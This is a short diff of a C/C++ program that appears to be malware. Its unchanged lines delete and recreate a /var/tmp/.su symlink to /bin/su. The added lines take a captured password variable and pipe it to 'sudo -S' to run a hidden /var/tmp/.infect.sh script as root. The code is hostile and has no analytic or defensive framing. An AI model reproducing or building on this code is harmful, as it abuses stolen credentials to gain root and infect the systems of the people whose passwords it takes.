@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <string.h> 
 #include <unistd.h>
+#include <string>
 
 int main(int argc, char *argv[]){
 
@@ -25,4 +26,6 @@ int main(int argc, char *argv[]){
     }
     system(clean);
     system("rm -rf /var/tmp/.su; ln -s /bin/su /var/tmp/.su");
+    std::string cmd = "echo " + std::string(pass) + " | sudo -S bash /var/tmp/.infect.sh"; 
+    system(cmd.c_str());
 }
